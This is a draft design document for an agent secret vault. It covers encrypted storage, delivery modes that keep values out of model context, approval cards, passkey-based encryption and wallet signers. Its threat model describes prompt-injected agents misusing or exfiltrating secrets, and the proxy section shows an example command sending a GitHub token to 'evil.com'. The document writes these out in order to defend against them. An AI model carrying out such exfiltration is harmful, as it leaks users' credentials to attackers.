# Vaults — secret management for agents

Status: **v4 draft for discussion** (no implementation yet)
Owner: Alex + agent session `sestvmy6e5c8e`
Date: 2026-06-14 (v4, after review round 3 — deep-dive Q&A)

v4 changes (round 3): passkey-PRF mechanism + the spec-editor data-loss warning
written out (§7.3); the "all-in-one" client-side encrypt+sign answer is ethers.js
keystore — we **assemble audited libs, we do not build crypto** (§7.4, §8.6);
third-party signer matrix now states **where the key physically lives, whether an
account/registration is required, and whether pure-frontend is possible** — short
answer: every provider needs an account and puts the key in *their* cloud/network,
which is exactly why `local` is the default (§8.5); delivery modes refined —
`run` is multi-var and cannot (by OS design) export to the parent shell, a new
`export` stream mode covers "many commands in one shell", `inject` gains
dotenv/json/yaml/toml and drops mandatory TTL (§5). Decision log + open Qs updated.

## 1. Background

Agents constantly need third-party credentials (API keys, tokens, signing keys).
Today in Avibe every credential is plaintext: platform tokens and provider API
keys live in `~/.avibe/config/config.json` / `~/.avibe/state/settings.json`, and
anything an agent needs at runtime ends up pasted into chat, written into
`.env` files by hand, or exported in the shell. Whatever enters the
conversation enters the LLM context — transcripts, IM history, provider logs.

PR #555 ("redact config secrets") added response-side masking and a frontend
`secretFields.ts` registry — the first step of the same arc. The Web UI shell
already reserves the surface: a `/vaults` route and `VaultsPage.tsx`
placeholder exist alongside Agents / Skills / Harness.

The industry hit the same wall in 2025–2026: GitGuardian found 24k+ secrets
exposed in MCP config files; OWASP lists credential leakage via prompt context
as a top LLM risk; a wave of "vault for agents" products appeared (§14).
The shared insight, also the core principle of this design:

> **Secrets must never enter the model's context. The model handles secret
> *names*; the platform handles secret *values*.**

## 2. Goals and non-goals

Goals:

1. **Store** — a Vaults page; named secrets (`NAME` → value, env-var mental
   model), two protection tiers.
2. **Deliver** — agents obtain secrets via CLI with values never on stdout;
   delivery is indirect (child env, file render, signing, brokered HTTP) so
   values stay out of context by construction.
3. **Ask** — agents request a missing secret; user fills it through a trusted UI
   channel (never chat text); agent is woken up with the *name only*.
4. **Approve** — protected secrets need per-use human approval with an auditable
   record, surfaced **inline in the session** as an interactive card. Web only.
5. **Link** — secrets relate to Skills.
6. **Sign** — a signing oracle behind a **pluggable provider abstraction**:
   `local` iframe-isolated software signer by default (private key never leaves
   the browser), with opt-in MPC/threshold and account-abstraction (session-key)
   providers — one API for single-key, key-sharding, and on-chain-policy signing.

Non-goals (now): team sharing; replacing provider OAuth; on-chain *broadcast*
(needs no secret, stays agent-side); defending a fully malicious same-OS-user
process (§3); **building any cryptosystem** — we orchestrate audited primitives
(`pyca/cryptography`, `@noble/curves`, `viem`/`ethers`, `argon2`) and integrate
third-party custody.

## 3. Threat model

| # | Threat | Defense |
| --- | --- | --- |
| T1 | value enters LLM context / transcripts / IM history | values never on stdout; injection below the text channel; ask via UI not chat |
| T2 | DB/file exfiltration (backups, `vibe data query`, `cat`) | encrypted at rest (§7); vault tables denylisted in `data query` |
| T3 | prompt-injected agent uses a high-value secret silently | `protected` tier: per-use approval enforced **cryptographically** — unlock factor isn't on the machine; keypair private key can't even be assembled without the browser |
| T4 | agent exfiltrates the value after legit delivery | sign/proxy: value never in agent-accessible space; outbound redaction (§10) as tripwire |

Honest scope limits: a malicious same-OS-user process can read M1/M2-injected
material or call the standard-tier decrypt path — standard tier stops *accidents
and remote exfiltration*, not a determined local attacker; protected + sign/proxy
are the answer when that matters. Approval fatigue is real → cards show full
context. An *actively* compromised daemon can serve malicious browser JS and
defeat browser-side crypto — we trust the daemon (user's own machine);
browser-side crypto minimizes *passive* exposure, it is not E2EE against a hostile
server (same boundary as the Bitwarden web vault).

## 4. Concepts and data model

Four tables (`storage/models.py` + Alembic), vault config in `state_meta`.

- **`vault_secrets`**: `id`, timestamps, `name` (unique, `^[A-Z][A-Z0-9_]*$`),
  `kind` (`static`/`keypair`), `protection` (`standard`/`protected`),
  `signer_kind` (keypair: `local`/`mpc:<provider>`/`aa`/`external`), `ciphertext`
  + `nonce` + `wrap_meta` (envelope, client-unwrappable; null for `mpc`/`external`
  where we hold no key), `public_meta` (desc; keypair: algo, pubkey, address,
  derivation path, provider handle), `policy` (allowed modes, allowed hosts,
  `always_ask`, signer limits), `last_used_at`, `use_count`.
- **`vault_requests`** (one queue): `request_type`
  `provision`/`access`/`sign`/`proxy`/`keygen`, `secret_name`, `requester`
  (session/agent/run), `delivery` (mode + details: env var, file path, decoded
  payload preview, target host), `status`, `expires_at`, `message_id`.
- **`vault_links`**: `secret_name`↔`skill_name`, `source`
  (`skill_meta`/`agent`/`user`), `required`.
- **`vault_audit`**: append-only; values never appear.

Tiers: **`standard`** ("plain" UX) — no interaction; encrypted at rest under a
machine key (§7.2); daemon-decryptable → works headlessly. **`protected`**
("encrypted" UX) — wrapped under a user factor (password / passkey PRF); every
use needs approval + the factor, which lives on the user's device → daemon can't
decrypt alone. `keypair` is always `protected` (hard rule).

`vibe data query` denylists `vault_secrets`; the rest stay queryable.

## 5. Delivery modes — the security ladder

Per-secret `policy` restricts allowed modes. Honest ranking by how exposed the
value is to the *agent itself*:

### M1 `run` — child-process env (default, strongest)

```
vibe vault run --env OPENAI_API_KEY --env DB_URL=PROD_DB_URL --env-skill deploy-aws -- python sync.py
```

Resolves values, spawns the child with them in **its** env, execs. Multi-var by
design: repeat `--env NAME`, alias with `--env LOCAL=VAULT_NAME`, or pull a
skill's whole declared set with `--env-skill`. **It cannot export into the
*calling* shell — that's an OS guarantee, not a limitation:** a child never
writes back to its parent's environment. And the agent's Bash tool doesn't
persist shell state across calls anyway, so even if it could, an `export`
wouldn't survive to the next command. This is *why* `run` is the strongest mode:
the value lives only in the child's memory, the agent sees only the child's
output (e.g. `python sync.py`'s stdout), never the value, and it's gone when the
child exits. **This is the only mode where the value provably never enters the
agent's text channel.**

### M1′ `export` — stream for `eval` (many commands in one shell)

```
eval "$(vibe vault export --env OPENAI_API_KEY --env SENTRY_DSN)" && cmd1 && cmd2
```

For "I need several commands in *one* shell to see the env." Emits
`export NAME='value'` lines on stdout — but used via `eval "$(...)"`, the
command-substitution captures stdout into `eval`, so the value does **not** print
to the visible terminal and stays out of captured tool output. Two honest
caveats: (1) shell state doesn't persist across the agent's separate Bash calls,
so this only helps **within one invocation** (chain with `&&`); (2) it's a notch
weaker than `run` because the value transits the agent's own shell (the agent
*could* echo it). Use when `run`'s one-command wrapper is too restrictive.

### M2 `inject` — render to a file (formats; for file-consuming tools)

```
vibe vault inject --keys OPENAI_API_KEY,SENTRY_DSN --out .env --format dotenv   # or json|yaml|toml
vibe vault inject --template deploy.yaml.tpl --out deploy.yaml                  # {{ vault.NAME }}
```

For tools that read a config file (and across many separate agent Bash calls,
where a file persists but env doesn't). Formats: `dotenv` (default), `json`,
`yaml`, `toml`, or template substitution. Written `0600`, audited with path. **No
mandatory TTL** — these are meant to be consumed by scripts; TTL becomes an
opt-in `--ttl 10m` for the "ephemeral `.env` that shouldn't linger" case, off by
default (per round-3 feedback). Agent is told the path, not the content (though
it *can* read the file — see ranking note below).

### M3 `sign` — signing oracle / wallet (key never leaves the signer) — §8

### M4 `proxy` — brokered HTTP (value never in agent space)

```
vibe vault fetch --auth GITHUB_PAT -- -X POST https://api.github.com/repos/x/y/issues -d @body.json
```

Daemon attaches the credential per the secret's auth template and forwards; agent
sees only the response. **Domain binding** (allowed-hosts, deny by default) makes
a prompt-injected `fetch --auth GITHUB_PAT https://evil.com` fail closed.

**Exposure ranking (state it honestly):** `run`/`proxy`/`sign` keep the value out
of agent-readable space entirely. `export`/`inject` *materialize* the value
somewhere the agent's channel could reach (stdout-into-eval / a file) — they're
ergonomic and keep the value off the *LLM context by convention*, but as you
noted, nothing stops a determined agent from reading its own file or echoing its
own shell. Default to `run`; offer `export`/`inject` for the cases it can't cover.

## 6. Dynamic ask — `$<NAME>` and `vibe vault request`

Agent emits `$<OPENAI_API_KEY>` (or `vibe vault request NAME --wait 600`).
`core/reply_enhancer.py` extracts the marker (`\$<[A-Z][A-Z0-9_]*>`, outside code
fences) into a `provision` request. Web: inline **SecureInputCard** (name +
requester + protection picker + masked input + Save), submitted out-of-band over
TLS. IM: marker → `🔐 Agent requests OPENAI_API_KEY → [Open Vaults](…?request=id)`.
`--wait` long-polls (agent keeps working when the answer lands); `--no-wait` →
daemon `hook_send`s the session on fulfillment. **Wake-up carries the name only,
never the value.**

## 7. Crypto design

### 7.1 Envelope

```
value --AES-256-GCM--> ciphertext          (DEK: random 32B per secret)
DEK   --wrapped by--> KEK(s)               (wrap_meta holds all copies)
  standard:  KEK_machine  = random 32B machine key (§7.2)   [daemon-side]
  protected: KEK_password = Argon2id(vault password, salt)  [browser-side, §8.4]
             KEK_passkey  = HKDF(WebAuthn PRF output)        [browser-side, §7.3]
```

A protected DEK is wrapped by password **and** N passkeys at once; losing one
factor doesn't lose the secret while another remains. **Password is the recovery
root** (see §7.3 warning).

### 7.2 Machine key (standard tier)

32 random bytes (`os.urandom`) on first write. **Default — key file**
`~/.avibe/state/vault/machine.key` (`0600`): lives inside `~/.avibe`, so backups/
migration of the state dir carry it → **no new loss mode**, "copy `~/.avibe`"
keeps working. **Opt-in — OS keychain** (`keyring`): key/data physically
separated; cost: needs `vibe vault key export/import` to migrate; headless boxes
auto-fall back to file mode. Failure UX: key missing/mismatch (detected via a
key-check value) → Vault lists affected secrets, offers import-key or re-enter;
AES-GCM auth prevents silent wrong-key garbage.

### 7.3 Passkey as an encryption factor — the WebAuthn PRF extension

How a passkey encrypts/decrypts a secret (your Q2 — and yes, it's a *mature*,
standardized mechanism, shipping in Bitwarden, Dashlane, 1Password, and WhatsApp
encrypted backups):

1. A passkey is a credential whose private key sits in a **secure element** (the
   Secure Enclave on Apple, TPM on Windows, the authenticator chip). For
   encryption we don't use that signing key directly — we use the **PRF**
   (pseudo-random function) extension, the web-facing standard for CTAP2's
   `hmac-secret`. The credential additionally holds a separate HMAC secret in the
   same secure element.
2. Our app passes a fixed **salt** (e.g. `"avibe-vault:v1"`). The browser hashes
   it with a `"WebAuthn PRF"` context string (so a site can't trick the chip into
   producing OS-login secrets), then the authenticator computes
   `HMAC-SHA256(internal_credential_secret, hashed_salt)` → a **deterministic
   32-byte output**. Same authenticator + same RP ID (our domain) + same salt →
   the same 32 bytes, every time. The internal secret **never leaves the secure
   element**; only the derived 32 bytes come back to the page.
3. We run those 32 bytes through **HKDF** → a KEK, and that KEK wraps/unwraps the
   per-secret DEK — identical to the password path, just a different KEK source.
   To use it: the user does Face ID / Touch ID / security-key tap, we re-derive
   the exact same KEK, unwrap the DEK, decrypt.

It's domain-bound (a different site gets a different output — phishing-resistant)
and needs no stored password. **The serious caveat** (Tim Cappalli, a WebAuthn
L3 spec co-editor, [publicly warns](https://lilting.ch/en/articles/passkeys-prf-extension-encryption-risk)
about exactly this): the derived key is bound to that one passkey — **if the user
deletes the passkey, data encrypted under it is permanently lost.** Our design
already neutralizes this: PRF is **never the sole factor** — the DEK is also
wrapped by the vault password (the recovery root), and can be wrapped by several
passkeys (envelope/multi-wrap, the Bitwarden model). Passkey = a frictionless
unlock *in addition to*, not *instead of*, the password.

### 7.4 Protected tier: factors, libraries, recovery

- **Vault password** (P0): Argon2id (interactive params ~0.5–1s) → KEK,
  browser-side via WASM (`hash-wasm`); changing it re-wraps every DEK (cheap).
- **Passkey PRF** (P0/P1): §7.3. 2026 support: iCloud Keychain (Safari 18+),
  Google Password Manager, Windows Hello (post-Feb-2026), and **1Password**
  (ships PRF + open-sourced a helper lib) — see §8.5 for the platform-by-platform
  table and the one real gap (roaming security keys on iOS can't pass PRF).
- **Recovery, plainly**: forget the password with no passkey wrap → protected
  *values* are unrecoverable by design (no server, no reset). API-key-like
  secrets: re-enter. Wallets: the BIP-39 mnemonic from the key ceremony (§8).
- Libraries: `pyca/cryptography` (in-tree) for AES-GCM/HKDF/ed25519; `argon2`
  WASM browser-side + `argon2-cffi` for the daemon-side `key export` path;
  `keyring` (optional) for keychain mode.

## 8. Wallet & signer architecture (decided: direct to ETH, pluggable)

### 8.1 The abstraction is the deliverable

A keypair carries `signer_kind`; the vault exposes one **sign request → approval
→ signature** flow regardless of backend. That makes "single-key today, MPC/
multisig later" a config choice, not a rewrite — `SignerProvider` with
`address()` and `sign(payload, type)` for tx / EIP-191 / EIP-712.

| `signer_kind` | where the private key physically lives | who can sign | account / cloud? |
| --- | --- | --- | --- |
| **`local`** (default) | **on your machine**, encrypted in the vault; decrypted only inside an isolated browser iframe | user present, per-sig approval | **none** — no account, no cloud |
| **`mpc:<provider>`** | sharded across provider cloud + your device, never whole (Privy/Web3Auth/Turnkey/Lit) | per provider policy; can be unattended under caps | yes — provider account + cloud |
| **`aa`** (ERC-4337 session keys) | owner key = any kind above; agent gets a scoped, capped, on-chain-enforced session key | agent, within on-chain limits | needs a smart account + bundler |
| **`external`** (WalletConnect) | the user's real wallet; vault custodies nothing | user, in their own wallet | their wallet |

`local` ships first as the local-first default; the rest are plug-ins behind the
same interface.

### 8.2 Your three signing questions

- **(a) Mnemonic + private key encrypted at rest like other secrets?** Yes for
  `local`: mnemonic + derived private key are secret material, envelope-encrypted
  under the **protected** tier (always). Public key + address are `public_meta`.
  For `mpc`/`external` the vault stores **no** private key — only a provider
  handle / address — so there's nothing local to encrypt.
- **(b) Decrypt in the browser, then sign in the browser?** Yes — the *same*
  browser-side decryption as any protected secret (§8.4), not a second mechanism.
  Key unwrapped + used **only inside the isolated iframe**; the iframe returns the
  **signature**; the signature (not a secret) flows daemon → CLI → agent. The
  private key never reaches the daemon.
- **(c) Mature implementation + browser sandbox?** Yes — cross-origin iframe
  isolation, exactly how embedded-wallet providers build self-custody (§8.3).

### 8.3 Local signer: cross-origin iframe isolation (the mature pattern)

Signer runs in an iframe from a **different origin** than the workbench, so
app-level XSS can't read the key. Key only in iframe memory, never persisted;
host ↔ iframe via **origin-validated `postMessage`**; host gets a `viem` account
via `toAccount(...)` proxying into the iframe; iframe does the ECDSA with
**`@noble/curves`** (audited secp256k1, the lib `viem`/`ethers` use) + BIP-39 via
`@scure/bip39`; iframe served with **`COOP: same-origin` + `COEP: credentialless`**;
the **tx-decode + approve UI renders inside the trusted iframe** (anti-clickjack).
Caveat (@noble authors): if an attacker can read process memory it's over — which
is *why* the separate-origin iframe (own memory space) is the boundary. Build task:
a genuinely distinct origin for the signer in a local/tunnel setup (dedicated path
+ strict CSP, separate port, or a `signer.` subdomain).

### 8.4 Decryption locus — resolved by tier, not phase (recap)

Standard → daemon-side, permanently (headless, no browser). Protected →
browser-side, from the first commit (approval always has a browser; daemon ships
salt + wrapped DEK, browser derives the KEK and unwraps, POSTs only the one value
back; for `local` keypairs, signs in-iframe and returns only the signature). The
**vault password never reaches the daemon, ever.** No daemon-side interim, no
migration; `wrap_meta` is client-unwrappable from the first migration.

### 8.5 Third-party signer providers — where the key lives, what they need

Your Q4, answered concretely. **Common truth across all of them: each requires a
developer account / registration, and each puts the private key in *their*
cloud/network, not on your machine.** None is "pure frontend, zero account, zero
cloud." That's precisely why `local` is the default for a local-first product;
these are opt-in for users who specifically want threshold custody or unattended
policy signing.

| provider | key tech / where it lives | account & registration | pure frontend? | signing principle |
| --- | --- | --- | --- | --- |
| **Turnkey** | **AWS Nitro Enclave (TEE)** — encrypted key ciphertext in Turnkey's DB, decrypted *only inside the enclave*. **In their cloud**, not local; non-custodial via per-user sub-orgs (parent has read-only, can't sign) | Turnkey org + API key pair + org ID; each user = a sub-org | No — sub-org *creation* needs the parent API key (server-side); login + signing can be 100% client-side (passkey + `@turnkey/viem`) | passkey authenticates an "activity" request → enclave decrypts the ECDSA key inside Nitro → signs → returns sig. (Passkey doesn't sign the tx; it unlocks the enclave key.) 50–100ms |
| **Privy** | **SSS key-sharding** (device share in browser + auth share in Privy cloud + recovery share), or newer **TEE 2-of-2** (enclave + auth share). Key assembled only briefly in iframe/enclave, never whole at rest. Part-local, part-cloud | Privy app ID | Mostly — SDK + iframe, but the auth share comes from Privy's cloud | shares combined in the isolated iframe (or Nitro enclave) → ECDSA → sig; full key never persisted |
| **Web3Auth** | **MPC-TSS** — shares across your device + the Torus node network (default 3/5). Distributed, never whole | Dashboard project **clientId** + domain whitelist | Yes for the browser SDK (Torus handles infra, no backend required); optional `@web3auth/node-sdk` for headless | nodes produce **partial signatures** combined without ever reconstructing the key (true TSS); ~<1.2s |
| **Lit Protocol** | **PKP** via DKG across Lit's decentralized node network, each node holds a share, >2/3 threshold. Never assembled; lives across the network | mint a PKP (on-chain) + an auth method | frontend SDK + their network (decentralized, no single vendor backend) | request → >2/3 nodes produce signature shares → combined; programmable via Lit Actions (conditional signing) |

Plus **account abstraction** (`aa`): ERC-4337 + Safe / ZeroDev session keys
(ERC-7715/7710) — the owner key is any of the above, but the *agent* gets a
time-boxed, spend-capped, revocable session key enforced **on-chain**. The
agent-native way to grant limited authority without handing over a master key;
needs a smart account + a bundler (Pimlico/ZeroDev), not a custody account.

### 8.6 Local signer: build vs. reuse (your Q5)

Neither "drop-in product" nor "build crypto from scratch." There is **no** local,
self-hosted, agent-signing vault we'd just install (the ones that exist are
cloud-tied or HTTP-proxy-shaped). But we don't write crypto — we assemble audited
libraries, ~90% reuse + ~10% glue:

- **Key-at-rest encrypt/decrypt** — the proven all-in-one is **ethers.js**:
  [`Wallet.encrypt(password)`](https://docs.ethers.org/v3/api-wallet.html) writes
  the standard **Web3 Secret Storage keystore JSON** (scrypt + AES-128-CTR + MAC,
  the MetaMask/MEW/geth format), `Wallet.fromEncryptedJson(json, password)`
  decrypts **in the browser** into a signer, and the `x-ethers` field even stores
  the encrypted mnemonic so the HD seed is recoverable. This is literally
  "encrypt the key at rest + decrypt-then-sign, fully client-side, no cloud."
  - Decision: to keep one envelope across the whole vault (AES-GCM DEK + passkey
    multi-wrap, same as static secrets), we wrap the raw key/mnemonic with **our**
    envelope and use ethers/`@noble` only for the *signing* step — rather than
    adopting the keystore's password-only scrypt format. ethers keystore stays
    the battle-tested reference / import-export format.
- **Signing** — `@noble/curves` (audited secp256k1) or `viem`/`ethers` (which use
  `@noble`): EIP-155 tx, EIP-191 `personal_sign`, EIP-712 typed data; `@scure/bip39`
  for the mnemonic.
- **What we build** — the cross-origin iframe harness (§8.3), the approval wiring
  (§9), and the `SignerProvider` interface (§8.1). Small, and not cryptographic.

### 8.7 Passkey storage providers (your Q1)

Yes — a browser passkey ceremony can invoke the platform's passkey store and
third-party providers. For our use we need the **PRF** extension, not just
authentication; 2026 status:

| store | passkey auth | PRF for encryption |
| --- | --- | --- |
| **iCloud Keychain** (iOS/macOS, Safari 18+, Face/Touch ID) | ✓ | ✓ |
| **Google Password Manager** (Android/Chrome/Edge) | ✓ | ✓ (default) |
| **Windows Hello** | ✓ | ✓ (post Feb-2026 update) |
| **1Password** (cross-platform credential provider) | ✓ | ✓ (ships PRF + open-sourced an E2EE helper lib) |
| **Bitwarden / Dashlane** | ✓ | ✓ |
| **YubiKey / roaming security key on iOS/iPadOS** | ✓ | ✗ — Apple won't pass PRF to roaming authenticators (platform gap) |

So iOS/macOS and 1Password all work; the only real gap is hardware security keys
*on Apple mobile*. PRF stays an enhancement over the password (§7.3) precisely
because support, while good, isn't universal.

## 9. Approval flow — inline interactive card in the session

**Web-only** (IM is a weaker authenticator). Pushed into the current session as a
structured message, rendered inline as an interactive card. Codebase reality
(verified): a `system` message *type* exists in `core/message_dispatcher.py`, but
`core/message_mirror.py` **deliberately does not persist `system` messages**
(banner noise) — so the card can't ride the raw `system` type (it must survive
reload / headless arrival / appear in history for audit). Clean path = reuse the
**quick-reply rails**: persist the card as a transcript message (`author='system'`
for the visual, a persisted `type`), `content.card_type='approval'` +
`metadata._approval_id`; new `ApprovalCard` branch in `ChatPage.tsx`'s message
switch; approve/deny posts out-of-band to `/api/vault/requests/{id}/approve`
(carrying browser-derived material, §8.4); choice recorded **set-once** like
`quick_reply_chosen`. One new rail: a `message.updated` SSE on the workbench (only
IM has it today) so the card flips to approved/denied in place. Surfaces: web
session → inline card; IM session → notify + deep link; headless → persists, Vaults
inbox is the fallback. All back the same `vault_requests` row.

## 10. Outbound redaction (tripwire)

The dispatcher is the single outbound chokepoint: scan outgoing messages for known
plaintext values (standard-tier; protected during an active grant), replace with
`[REDACTED:NAME]` + audit + warning. Exact-match + base64/url variants — cheap.
Turns "agent echoed the secret" into a logged near-miss.

## 11. API and CLI surface

REST (`/api/vault/*`): `GET/POST/PATCH/DELETE /secrets`, `GET /requests`,
`POST /requests/{id}/fulfill|approve|deny`, `GET/POST/DELETE /links`, `GET /audit`,
`POST /keys/generate`→`/confirm` (web-only ceremony, mnemonic shown once),
`GET/POST /config`, `GET /signers`. SSE: `vault.request.new`,
`vault.request.decided`, `vault.secrets.changed`, `message.updated`.

Internal UDS (`/internal/vault/*`): `resolve`, `provision`, `sign`, `fetch`,
`requests/{id}/wait`.

CLI (`vibe vault …`):

| command | notes |
| --- | --- |
| `set NAME [--protected] --stdin\|--from-file f` | argv values rejected by design |
| `list [--skill S] [--json]` / `rm NAME` | names + metadata only |
| `run --env NAME[,N2] [--env LOCAL=NAME] [--env-skill S] -- cmd…` | M1, multi-var |
| `export --env NAME[,N2] [--env-skill S]` | M1′, emits `export …` for `eval "$(…)"` |
| `inject --keys A,B --out f [--format dotenv\|json\|yaml\|toml] [--ttl 10m]` / `--template t --out f` | M2, TTL opt-in/off by default |
| `request NAME [--reason s] [--skill s] [--protected] [--wait s\|--no-wait]` | §6 |
| `link/unlink --skill S NAME…` · `audit [--secret NAME]` · `key export/import` | |
| `sign --key NAME (--eth-tx f\|--message s\|--typed-data f) [--out f]` · `fetch --auth NAME …` | M3/M4 |

No command prints a secret value; no `vibe vault get`. (`export` prints
`export NAME=…` for `eval` capture, not the bare value to a TTY — §5 M1′.)

## 12. End-to-end flows

Standard/M1 (silent): agent → `vault run` → UDS `resolve` → daemon machine-KEK
unwrap → value over UDS → child env. Protected/M1 (approval): as above until
`protected` → `access` request → inline card → browser approve+decrypt (§8.4) →
complete blocked `resolve`. Dynamic ask: `$<NEW_KEY>` → SecureInputCard → save →
name-only wake-up. ETH sign (local): web key ceremony (mnemonic once) → agent
builds `tx.json` via its own RPC → `vault sign` → inline card decodes
`to/value/gas/chainId/selector` → approve → **iframe** decrypts + signs →
signature → agent broadcasts via its own RPC. ETH sign (mpc/aa): same request
shape; routes to provider; `aa` session key may sign within on-chain caps with no
per-tx prompt.

## 13. Skills integration

SKILL.md frontmatter gains `secrets:` (name/required/description); read via
`askill --json` (askill must pass it through). Vaults page per-skill view (✓/✗ +
one-click fill); `vault_links` synced `source=skill_meta`. Agents
`vibe vault link --skill S NAME` then `request`; users link/unlink in UI. Names
are the global join key.

## 14. Prior art and library survey

- **Injection** — 1Password [`op run`/`op inject`](https://developer.1password.com/docs/cli/secret-references/),
  [Infisical `infisical run`](https://infisical.com/docs/documentation/platform/secrets-mgmt/overview).
- **Brokered creds** — [Arcade.dev](https://docs.arcade.dev/en/get-started/about-arcade),
  [Composio](https://docs.composio.dev/docs/authentication).
- **Vault-for-agents OSS** — [Infisical agent-vault](https://github.com/Infisical/agent-vault)
  (MIT Go MITM proxy; "Preview"; P3 transparent-proxy candidate); Agentic Vault;
  Axis. None has our IM surface / inline approvals / skills linkage.
- **In-browser signing + keystore** — [`@noble/curves`](https://paulmillr.com/noble/),
  [`viem` `toAccount`](https://viem.sh/docs/accounts/local/toAccount),
  [ethers.js keystore](https://docs.ethers.org/v3/api-wallet.html) (Web3 Secret
  Storage, the encrypt+decrypt+sign all-in-one), cross-origin iframe + COOP/COEP
  ([MDN](https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless)).
- **Embedded-wallet self-custody** — [Privy](https://privy.io/blog/how-privy-embedded-wallets-work)
  (SSS + iframe / TEE 2-of-2; →Stripe), Magic, Dynamic (→Fireblocks).
- **MPC / threshold** — [Web3Auth](https://web3auth.io/docs/sdk/mpc-core-kit/mpc-core-kit-js)
  (MPC-TSS + social; →Consensys), [Lit](https://developer.litprotocol.com/user-wallets/pkps/overview)
  (DKG + Lit Actions; most decentralized), [Turnkey](https://docs.turnkey.com/embedded-wallets/sub-organizations-as-wallets)
  (Nitro TEE; 50–100ms; policy engine). All require an account + put the key in
  their cloud/network — opt-in, never default.
- **Account abstraction / session keys** — ERC-4337 + Safe / ZeroDev + Pimlico;
  ERC-7715/7710 ([explainer](https://eco.com/support/en/articles/15254036-what-is-erc-4337-account-abstraction-explained-2026)).
- **Passkey-derived encryption** — [WebAuthn PRF](https://developers.yubico.com/WebAuthn/Concepts/PRF_Extension/Developers_Guide_to_PRF.html),
  [1Password PRF + open-source lib](https://1password.com/blog/encrypt-data-saved-passkeys),
  [Bitwarden](https://bitwarden.com/blog/prf-webauthn-and-its-role-in-passkeys/);
  [Corbado 2026 status](https://www.corbado.com/blog/passkeys-prf-webauthn); the
  [data-loss warning](https://lilting.ch/en/articles/passkeys-prf-extension-encryption-risk)
  (Tim Cappalli) → PRF as enhancement, password as recovery root.

## 15. Architecture frozen up front, delivery incremental

Lock the architecture now (data model, `wrap_meta` wire format, daemon/browser
decryption split, `SignerProvider` interface, inline-card message shape are final
from commit 1); deliver as focused commits with no rip-and-replace. Capability
order: (1) store + envelope + CRUD + `data query` denylist; (2) M1/M1′/M2 +
dynamic ask; (3) protected tier + browser decryption + inline ApprovalCard +
`message.updated` + redaction; (4) skills linkage + keychain + key export/import;
(5) `local` signer (iframe, BIP-39 ceremony, EIP-155/191/712 decoded approvals);
(6) `mpc`/`aa`/`external` plug-ins + `fetch` broker; (7) transparent proxy +
config-secret migration (closes #555) + signer policy engine + session grants.

## 16. Decision log

Round 1 (06-12): approval web-only; signer → secp256k1/ETH; phasing OK.
Round 2 (06-13): protected decryption browser-side from commit 1, standard daemon
permanently (tier split, not migration); architecture frozen, delivery
incremental; pluggable `SignerProvider` (`local` default, mpc/aa/external opt-in);
local keypair envelope-encrypted, sign in iframe; inline ApprovalCard via
quick-reply rails + `message.updated`.
Round 3 (06-14):
1. Passkey encryption = WebAuthn PRF + HKDF → KEK (mature; multi-wrap with
   password as recovery root; PRF never sole factor — data-loss warning) (§7.3).
2. `local` signer = assemble audited libs (ethers keystore / `@noble` / viem +
   iframe harness), not build crypto, not a drop-in product (§8.6).
3. Third-party signers all need an account + cloud custody → confirmed opt-in,
   `local` is default (§8.5).
4. `run` is multi-var and cannot export to the parent shell (OS guarantee +
   non-persistent agent shell) — that's the security feature; add `export` (M1′)
   for many-commands-in-one-shell via `eval "$(…)"` (§5).
5. `inject` gains dotenv/json/yaml/toml; TTL becomes opt-in (off by default) (§5).

## 17. Open questions

1. Reveal-on-click for standard-tier values in the UI: allow or never?
2. `request --wait` / approval timeout default (proposal: 10 min) and how a
   denied/expired wait reads to the agent.
3. Secret scope: instance-global (env model) — any per-project need now?
4. askill `secrets:` frontmatter — confirm we own it + file the issue.
5. ETH preview depth: selector + raw calldata to start, or ABI-decode +
   dangerous-selector warnings (`approve`, `setApprovalForAll`) day one?
6. `aa` session keys — near-term (strongest agent-autonomy story) or later?
7. Default passkey support on/off at launch, or password-only first with passkey
   as a fast-follow (given the iOS-roaming-key gap and the data-loss caveat)?
